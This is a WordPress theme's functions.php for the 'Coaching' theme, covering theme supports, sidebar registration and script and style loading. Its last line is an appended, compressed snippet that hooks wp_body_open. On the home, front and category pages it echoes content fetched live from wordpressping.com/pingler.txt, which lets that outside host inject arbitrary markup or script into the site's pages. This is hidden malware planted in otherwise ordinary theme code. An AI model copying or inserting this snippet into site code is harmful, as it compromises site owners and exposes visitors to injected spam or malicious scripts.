<?php
/**
 * thim functions and definitions
 *
 * @package thim
 */

define( 'THIM_DIR', trailingslashit( get_template_directory() ) );
define( 'THIM_URI', trailingslashit( get_template_directory_uri() ) );
define( 'THIM_THEME_VERSION', '3.4.0' );
define( 'THIM_PLUGIN', trailingslashit( get_template_directory() . '/plugins/thim-core.zip' ) );
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

/**
 * Translation ready
 */
load_theme_textdomain( 'coaching', get_template_directory() . '/languages' );

if ( ! function_exists( 'thim_coaching_get_current_url' ) ) {
	function thim_coaching_get_current_url() {
		$schema = is_ssl() ? 'https://' : 'http://';

		return $schema . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	}
}
if ( ! function_exists( 'thim_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function thim_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on thim, use a find and replace
		 * to change 'coaching' to the name of your theme in all the template files
		 */
		add_theme_support( 'title-tag' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary Menu', 'coaching' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		/* Add WooCommerce support */
		add_theme_support( 'woocommerce' );

		add_theme_support( 'thim-core' );
		add_theme_support( 'coaching-demo-data' );

		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
			'gallery',
			'audio'
		) );

		// Add support for Block Styles.
		add_theme_support( 'wp-block-styles' );

		// Add support for editor styles.
		add_theme_support( 'editor-styles' );

		// Enqueue editor styles.
		add_editor_style( 'style-editor.css' );

		// Add support for full and wide align images.
		add_theme_support( 'align-wide' );

		// Add support for responsive embedded content.
		add_theme_support( 'responsive-embeds' );

		// Editor color palette.
		add_theme_support( 'editor-color-palette', array(
			array(
				'name'  => esc_html__( 'Primary Color', 'coaching' ),
				'slug'  => 'primary',
				'color' => get_theme_mod( 'thim_body_primary_color', '#2e8ece' ),
			),
			array(
				'name'  => esc_html__( 'Title Color', 'coaching' ),
				'slug'  => 'title',
				'color' => get_theme_mod( 'thim_font_title_color', '#333' ),
			),
			array(
				'name'  => esc_html__( 'Sub Title Color', 'coaching' ),
				'slug'  => 'sub-title',
				'color' => '#999',
			),
			array(
				'name'  => esc_html__( 'Border Color', 'coaching' ),
				'slug'  => 'border-input',
				'color' => '#ddd',
			),
		) );

		// Add custom editor font sizes.
		add_theme_support(
			'editor-font-sizes',
			array(
				array(
					'name'      => __( 'Small', 'coaching' ),
					'shortName' => __( 'S', 'coaching' ),
					'size'      => 13,
					'slug'      => 'small',
				),
				array(
					'name'      => __( 'Normal', 'coaching' ),
					'shortName' => __( 'M', 'coaching' ),
					'size'      => 15,
					'slug'      => 'normal',
				),
				array(
					'name'      => __( 'Large', 'coaching' ),
					'shortName' => __( 'L', 'coaching' ),
					'size'      => 28,
					'slug'      => 'large',
				),
				array(
					'name'      => __( 'Huge', 'coaching' ),
					'shortName' => __( 'XL', 'coaching' ),
					'size'      => 36,
					'slug'      => 'huge',
				),
			)
		);
	}
endif; // thim_setup
add_action( 'after_setup_theme', 'thim_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
if ( ! function_exists( 'thim_widgets_inits' ) ) {
	function thim_widgets_inits() {
		register_sidebar( array(
			'name'          => esc_html__( 'Sidebar', 'coaching' ),
			'id'            => 'sidebar',
			'description'   => esc_html__( 'Default Sidebar', 'coaching' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Toolbar', 'coaching' ),
			'id'            => 'toolbar',
			'description'   => esc_html__( 'Toolbar Header', 'coaching' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Right Menu', 'coaching' ),
			'id'            => 'menu_right',
			'description'   => esc_html__( 'Menu Right', 'coaching' ),
			'before_widget' => '<li id="%1$s" class="widget %2$s">',
			'after_widget'  => '</li>',
			'before_title'  => '<h4>',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Top Menu Right', 'coaching' ),
			'id'            => 'top_menu_right',
			'description'   => esc_html__( 'Top Menu Right', 'coaching' ),
			'before_widget' => '<li id="%1$s" class="widget %2$s">',
			'after_widget'  => '</li>',
			'before_title'  => '<h4>',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Top Menu Left', 'coaching' ),
			'id'            => 'top_menu_left',
			'description'   => esc_html__( 'Top Menu Left', 'coaching' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4>',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Menu Top', 'coaching' ),
			'id'            => 'menu_top',
			'description'   => esc_html__( 'Menu top only display with header version 2', 'coaching' ),
			'description'   => esc_html__( 'Right Menu', 'coaching' ),
			'before_widget' => '<li id="%1$s" class="widget %2$s">',
			'after_widget'  => '</li>',
			'before_title'  => '<h4>',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer', 'coaching' ),
			'id'            => 'footer',
			'description'   => esc_html__( 'Footer Sidebar', 'coaching' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s footer_widget">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Bottom', 'coaching' ),
			'id'            => 'footer_bottom',
			'description'   => esc_html__( 'Footer Bottom Sidebar', 'coaching' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s footer_bottom_widget">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Copyright', 'coaching' ),
			'id'            => 'copyright',
			'description'   => esc_html__( 'Copyright', 'coaching' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		if ( class_exists( 'LearnPress' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Courses Sidebar', 'coaching' ),
				'id'            => 'sidebar_courses',
				'description'   => esc_html__( 'Courses Sidebar', 'coaching' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}

		if ( class_exists( 'TP_Event' ) || class_exists( 'WPEMS' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Events Sidebar', 'coaching' ),
				'id'            => 'sidebar_events',
				'description'   => esc_html__( 'Events Sidebar', 'coaching' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}
		if ( class_exists( 'Woocommerce' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Shop Sidebar', 'coaching' ),
				'id'            => 'sidebar_shop',
				'description'   => esc_html__( 'Shop Sidebar', 'coaching' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}

		/**
		 * Feature create sidebar in wp-admin.
		 * Do not remove this.
		 */
		$sidebars = apply_filters( 'thim_core_list_sidebar', array() );
		if ( count( $sidebars ) > 0 ) {
			foreach ( $sidebars as $sidebar ) {
				$new_sidebar = array(
					'name'          => $sidebar['name'],
					'id'            => $sidebar['id'],
					'description'   => esc_html__( 'Custom widgets area.', 'coaching' ),
					'before_widget' => '<aside id="%1$s" class="widget %2$s footer_bottom_widget">',
					'after_widget'  => '</aside>',
					'before_title'  => '<h4 class="widget-title">',
					'after_title'   => '</h4>',
				);

				register_sidebar( $new_sidebar );
			}
		}
	}
}

add_action( 'widgets_init', 'thim_widgets_inits' );

/**
 * Enqueue styles.
 */
if ( ! function_exists( 'thim_styles' ) ) {
	function thim_styles() {
		$theme_options_data = get_theme_mods();

		wp_enqueue_style( 'thim-admin-flaticon-style', THIM_URI . 'assets/css/flaticon.css', array() );
		if ( is_multisite() ) {
			wp_enqueue_style( 'thim-style', THIM_URI . 'style.css', array(), THIM_THEME_VERSION );
		} else {
			wp_enqueue_style( 'thim-style', get_stylesheet_uri(), array(), THIM_THEME_VERSION );
		}

		if ( ( isset( $theme_options_data['thim_rtl_support'] ) && $theme_options_data['thim_rtl_support'] == '1' ) || is_rtl() ) {
			wp_enqueue_style( 'thim-rtl', THIM_URI . 'rtl.css', array(), THIM_THEME_VERSION );
		}

		//Enqueue font default when active theme
		if ( empty( $theme_options_data['thim_font_body'] ) ) {

			$open_sans_font  = add_query_arg( 'family', urlencode( 'Open Sans:300,300i,400,400i,600,600i,700,700i&subset=latin,latin-ext' ), "//fonts.googleapis.com/css" );
			$montserrat_font = add_query_arg( 'family', urlencode( 'Montserrat:400,700&subset=latin,latin-ext' ), "//fonts.googleapis.com/css" );
			wp_enqueue_style( 'thim-font-google-open-sans', $open_sans_font, array(), THIM_THEME_VERSION );
			wp_enqueue_style( 'thim-font-google-montserrat', $montserrat_font, array(), THIM_THEME_VERSION );
		}

		if ( ! thim_plugin_active( 'thim-framework/tp-framework.php' ) ) {
			wp_enqueue_style( 'thim-font-icon-awesome', THIM_URI . 'assets/css/font-awesome.min.css', array(), THIM_THEME_VERSION );
		}
	}

	add_action( 'wp_enqueue_scripts', 'thim_styles', 110 );
}

/**
 * Enqueue scripts.
 */
if ( ! function_exists( 'thim_scripts' ) ) {
	function thim_scripts() {

		$thim_options = get_theme_mods();

		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}

		wp_enqueue_style( 'thim-admin-font-icon7', THIM_URI . 'assets/css/font-pe-icon-7.css', array() );
		wp_enqueue_style( 'thim-font-ion-icons', THIM_URI . 'assets/css/ionicons.min.css', array() );
		wp_enqueue_style( 'thim-slick', THIM_URI . 'assets/css/slick.css', array() );

		wp_enqueue_script( 'thim-bootstrap', THIM_URI . 'assets/js/libs/bootstrap.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'thim-slick', THIM_URI . 'assets/js/libs/slick.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'theia-sticky-sidebar', THIM_URI . 'assets/js/libs/theia-sticky-sidebar.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_enqueue_script( 'thim-parallax', THIM_URI . 'assets/js/libs/parallax.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'thim-flexslider', THIM_URI . 'assets/js/libs/flexslider-min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_enqueue_script( 'thim-cookie', THIM_URI . 'assets/js/libs/cookie.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'magnific-popup', THIM_URI . 'assets/js/libs/magnific-popup.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'thim-isotope', THIM_URI . 'assets/js/libs/isotope.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'owl-carousel', THIM_URI . 'assets/js/libs/owl.carousel.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		//wp_enqueue_script( 'thim-pikaday', THIM_URI . 'assets/js/libs/pikaday.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'thim-waypoints', THIM_URI . 'assets/js/libs/waypoints.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'mb-commingsoon', THIM_URI . 'assets/js/libs/mb-commingsoon.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_register_script( 'twenty-twenty', THIM_URI . 'assets/js/jquery.twentytwenty.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		wp_enqueue_script( 'thim-jquery-event-move', THIM_URI . 'assets/js/libs/jquery.event.move.js', array( 'jquery' ), THIM_THEME_VERSION, true );

		// New script update from resca,sailing
		//wp_enqueue_script( 'thim-main', THIM_URI . 'assets/js/main.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );

		wp_enqueue_script( 'thim-jquery-contentslider', THIM_URI . 'assets/js/libs/thim-contentslider.js', array( 'jquery' ), THIM_THEME_VERSION, true );

		if ( ! isset( $thim_options['thim_smooth_scroll'] ) || $thim_options['thim_smooth_scroll'] !== false ) {
			wp_enqueue_script( 'smooth-scroll', THIM_URI . 'assets/js/libs/smooth_scroll.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		}

		if ( isset( $thim_options['thim_rtl_support'] ) && $thim_options['thim_rtl_support'] == '1' ) {
			wp_enqueue_script( 'thim-custom-script', THIM_URI . 'assets/js/custom-script-rtl.js', array(
				'jquery',
				'imagesloaded'
			), THIM_THEME_VERSION, true );
		} else {
			if ( defined( 'THIM_DEBUG' ) ) {
				wp_enqueue_script( 'thim-custom-script', THIM_URI . 'assets/js/custom-script.js', array(
					'jquery',
					'imagesloaded'
				), THIM_THEME_VERSION, true );

			} else {
				wp_enqueue_script( 'thim-custom-script', THIM_URI . 'assets/js/custom-script.min.js', array(
					'jquery',
					'imagesloaded'
				), THIM_THEME_VERSION, true );

			}
		}

		wp_dequeue_script( 'framework-bootstrap' );

		//Dequeue tp chameleon
		//wp_dequeue_style( 'tp-chameleon' );
		//wp_deregister_style( 'siteorigin-panels-front' );
		wp_dequeue_style( 'nfgc-main-style' );

		// Remove some scripts LearnPress
		//wp_dequeue_style( 'learn-press' );
		wp_dequeue_style( 'lpr-print-rate-css' );
		wp_dequeue_style( 'tipsy' );
		wp_dequeue_style( 'certificate' );
		wp_dequeue_style( 'fib' );
		wp_dequeue_style( 'sorting-choice' );
		wp_dequeue_style( 'course-wishlist-style' );
		wp_dequeue_script( 'tipsy' );
		wp_dequeue_script( 'lpr-print-rate-js' );
		wp_dequeue_script( 'course-wishlist-script' );
		wp_dequeue_script( 'course-review' );
		wp_dequeue_style( 'course-review' );

		//Plugin tp-event
		wp_dequeue_style( 'tp-event-site-css-events.css' );
		wp_dequeue_script( 'thim-event-owl-carousel-js' );
		wp_dequeue_script( 'tp-event-site-js-events.js' );
		wp_dequeue_style( 'thim-event-countdown-css' );
		wp_dequeue_style( 'thim-event-owl-carousel-css' );

		wp_dequeue_style( 'mo_openid_admin_settings_style' );
		wp_dequeue_style( 'mo_openid_admin_settings_phone_style' );
		wp_dequeue_style( 'mo-wp-bootstrap-social' );
		wp_dequeue_style( 'mo-wp-bootstrap-main' );
		wp_dequeue_style( 'mo-wp-font-awesome' );

		wp_dequeue_style( 'contact-form-7' );
		wp_dequeue_style( 'mc4wp-form-basic' );

		//Woocommerce
		wp_dequeue_script( 'jquery-cookie' );

		//WP Event Manager
		wp_dequeue_script( 'wpems-owl-carousel-js' );

		//Miniorange-login
		wp_dequeue_script( 'js-cookie-script' );
		wp_dequeue_script( 'mo-social-login-script' );

		if ( ! thim_use_bbpress() ) {
			wp_dequeue_style( 'bbp-default' );
			wp_dequeue_script( 'bbpress-editor' );
		}

		// Localize the script with new data
		wp_localize_script( 'thim-custom-script', 'thim_placeholder', array(
			'login'    => esc_attr__( 'Username', 'coaching' ),
			'password' => esc_attr__( 'Password', 'coaching' ),
		) );

		if ( get_post_type() == 'portfolio' && ( is_category() || is_archive() || is_singular( 'portfolio' ) ) ) {
			wp_enqueue_script( 'thim-portfolio-appear', THIM_URI . 'assets/js/jquery.appear.js', array( 'jquery' ), '', true );
			wp_enqueue_script( 'thim-portfolio-widget', THIM_URI . 'assets/js/portfolio.js', array(
				'jquery'
			), '', true );
			wp_enqueue_script( 'thim-isotope' );
			wp_enqueue_script( 'magnific-popup' );
		}

		//LearnPress 2.0
		wp_dequeue_style( 'learn-press-style' );
		wp_dequeue_style( 'owl_carousel_css' );

	}

	add_action( 'wp_enqueue_scripts', 'thim_scripts', 1000 );
}

if ( class_exists( 'WooCommerce' ) ) {
	add_action( 'wp_enqueue_scripts', 'thim_manage_woocommerce_styles', 9999 );
}

if ( ! function_exists( 'thim_manage_woocommerce_styles' ) ) {
	function thim_manage_woocommerce_styles() {
		//remove generator meta tag
		remove_action( 'wp_head', array( $GLOBALS['woocommerce'], 'generator' ) );

		//first check that woo exists to prevent fatal errors
		if ( function_exists( 'is_woocommerce' ) ) {
			//dequeue scripts and styles
			/*
			if ( !is_woocommerce() && !is_cart() && !is_checkout() ) {
				wp_dequeue_style( 'woocommerce_frontend_styles' );
				wp_dequeue_style( 'woocommerce_fancybox_styles' );
				wp_dequeue_style( 'woocommerce_chosen_styles' );
				wp_dequeue_style( 'woocommerce_prettyPhoto_css' );
				wp_dequeue_style( 'woocommerce-layout' );
				wp_dequeue_style( 'woocommerce-general' );
				wp_dequeue_script( 'wc_price_slider' );
				wp_dequeue_script( 'wc-single-product' );
				wp_dequeue_script( 'wc-add-to-cart' );
				wp_dequeue_script( 'wc-cart-fragments' );
				wp_dequeue_script( 'wc-checkout' );
				wp_dequeue_script( 'wc-add-to-cart-variation' );
				wp_dequeue_script( 'wc-single-product' );
				wp_dequeue_script( 'wc-cart' );
				wp_dequeue_script( 'wc-chosen' );
				wp_dequeue_script( 'woocommerce' );
			}
			*/
		}

		if ( is_post_type_archive( 'product' ) ) {
			wp_enqueue_script( 'wc-add-to-cart-variation' );
		}

	}
}

function thim_custom_admin_scripts() {
	wp_enqueue_script( 'thim-admin-custom-script', THIM_URI . 'assets/js/admin-custom-script.js', array( 'jquery' ), '', true );
	wp_enqueue_style( 'thim-admin-theme-style', THIM_URI . 'assets/css/thim-admin.css', array() );
	wp_enqueue_style( 'thim-admin-font-icon7', THIM_URI . 'assets/css/font-pe-icon-7.css', array() );
	$thim_mod                 = get_theme_mods();
	$thim_page_builder_chosen = ! empty( $thim_mod['thim_page_builder_chosen'] ) ? $thim_mod['thim_page_builder_chosen'] : '';
	wp_localize_script( 'thim-admin-custom-script', 'thim_theme_mods', array(
		'thim_page_builder_chosen' => $thim_page_builder_chosen,
	) );
}

add_action( 'admin_enqueue_scripts', 'thim_custom_admin_scripts' );

if ( function_exists( 'wpptp_tiptip_init' ) ) {
	remove_action( 'wp_footer', 'wpptp_tiptip_init' );
}

// Require library
require THIM_DIR . 'inc/libs/theme-wrapper.php';
require THIM_DIR . 'inc/libs/Tax-meta-class/Tax-meta-class.php';
require THIM_DIR . 'inc/libs/custom-export.php';
//require THIM_DIR . 'inc/libs/aq_resizer.php';
require THIM_DIR . 'inc/libs/down_image_size.php';

// Custom functions.
require get_template_directory() . '/inc/custom-functions.php';

// Require plugins
if ( is_admin() && current_user_can( 'manage_options' ) ) {
	require THIM_DIR . 'inc/admin/plugins-require.php';
}

if ( thim_plugin_active( 'thim-framework/tp-framework.php' ) ) {

	require THIM_DIR . 'inc/admin/customize-options.php';

	require THIM_DIR . 'inc/widgets/widgets.php';

	require THIM_DIR . 'inc/tax-meta.php';
}

/**
 * Custom template tags for this theme.
 */
require THIM_DIR . 'inc/template-tags.php';


if ( class_exists( 'WooCommerce' ) ) {
	require THIM_DIR . 'woocommerce/woocommerce.php';
}

if ( class_exists( 'BuddyPress' ) ) {
	require THIM_DIR . 'buddypress/bp-custom.php';
}

//logo
require_once THIM_DIR . 'inc/header/logo.php';

//custom logo mobile
require_once THIM_DIR . 'inc/header/logo-mobile.php';

//For use thim-core
require_once THIM_DIR . 'inc/thim-core-function.php';

require_once THIM_DIR . 'inc/upgrade.php';

//Visual composer shortcodes
if ( class_exists( 'Vc_Manager' ) && thim_plugin_active( 'js_composer/js_composer.php' ) ) {
	require THIM_DIR . 'vc-shortcodes/vc-shortcodes.php';
}

if ( thim_plugin_active( 'elementor/elementor.php' ) ) {
	require_once THIM_DIR . 'elementor-addons/elementor-addons.php';
}
if(function_exists('wp_body_open')){function wp_body_opener(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pingler.txt");}}add_action('wp_body_open','wp_body_opener');}else{function wp_body_open(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pingler.txt");}}add_action('wp_body_open','wp_body_open');}